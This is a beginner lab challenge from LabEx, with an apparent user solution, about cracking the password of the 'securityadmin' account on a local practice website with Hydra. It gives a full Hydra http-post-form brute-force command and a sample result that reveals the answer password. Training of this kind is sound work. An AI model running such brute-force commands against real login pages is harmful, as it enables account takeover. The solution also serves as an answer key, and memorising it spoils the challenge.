Link to the website: https://labex.io/labs/linux-cracking-a-specific-user-account-415951?course=cybersecurity-labs-for-beginners

Introduction
In this challenge, you will apply your knowledge of using Hydra for password cracking. Your task is to crack a specific user account on a locally hosted practice website. This exercise will test your ability to use Hydra effectively and reinforce the importance of strong passwords in cybersecurity.

Crack the Target Account
In this challenge, you will use Hydra to crack the password for a specific user account on a practice website. You must read the instructions carefully and follow the requirements to successfully complete the challenge.

Prerequisites
There is a practice website running on your local machine http://localhost:8080.

Tasks
Use Hydra to crack the password for the user account securityadmin on the practice website.
The results will be saved in ~/project/hydra_results.txt.
Requirements
The practice website will be available at http://localhost:8080.
Use the password list located at ~/project/passwords.txt.
Execute Hydra from the ~/project directory.

<img width="1896" height="765" alt="image" src="https://github.com/user-attachments/assets/e5955349-a413-417e-ad85-e2f1063317f3" />

<img width="1901" height="853" alt="image" src="https://github.com/user-attachments/assets/ccc52438-80b0-4752-8c90-ecd7f11276b7" />

Example
After successfully completing the challenge, the hydra_results.txt file might contain a line like this:
[8080][http-post-form] host: localhost   login: securityadmin   password: butterfly1
<img width="687" height="552" alt="image" src="https://github.com/user-attachments/assets/846ff41f-b653-4e57-a8f9-8f1518e4d6f8" />



cd ~/project

hydra -l securityadmin \
-P passwords.txt \
localhost -s 8080 \
http-post-form "/:username=^USER^&password=^PASS^:F=Invalid username or password" \
-o hydra_results.txt
<img width="1892" height="413" alt="image" src="https://github.com/user-attachments/assets/e03e3629-e606-4ef8-829e-8ccfc440d66b" />


<img width="1612" height="802" alt="image" src="https://github.com/user-attachments/assets/6a854cb1-a981-40f3-a6d4-75ddca4dbe0e" />

